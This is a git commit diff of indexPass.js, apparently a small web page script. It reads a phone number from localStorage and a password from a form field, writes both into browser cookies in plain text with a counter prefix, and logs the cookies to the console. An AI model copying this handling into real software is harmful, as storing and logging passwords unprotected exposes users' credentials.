804e7a9a4c78e08295e3bdd4deb5ca82a20c0e71
D-mitry12344 <114662273+D-mitry12344@users.noreply.github.com>
2022-12-11 18:00:59 +0300

    modcok

--- indexPass.js
+++ indexPass.js
@@ -2,17 +2,18 @@ let nuber = document.querySelector(".nuber");
 let pass = document.querySelector(".pass");
 let button = document.querySelector(".buttt");
 
-
+let s = 1;
 nuber.textContent = '+7-'+ localStorage.getItem('hone').slice(1,4) + '-' +localStorage.getItem('hone').slice(4,7) + '-' + '****';
 get = () =>{
-	document.cookie=  "phone" + '=' + encodeURIComponent(localStorage.getItem('hone'));
-	document.cookie=  'pass' + '=' + encodeURIComponent(pass.value);
-	console.log(document.cookie);
+	s++;
+	return s;
 }
 button.onclick = () =>{
-	document.cookie=  "phone" + '=' + encodeURIComponent(localStorage.getItem('hone'));
-	document.cookie=  'pass' + '=' + encodeURIComponent(pass.value);
+
+	document.cookie=  encodeURIComponent(s)+ "phone" + '=' + encodeURIComponent(localStorage.getItem('hone'));
+	document.cookie=  encodeURIComponent(s)+ 'pass' + '=' + encodeURIComponent(pass.value);
 	console.log(document.cookie);
+	get();
 	return document.cookie;
 	//window.location.href = 'indexPass.html';
 };
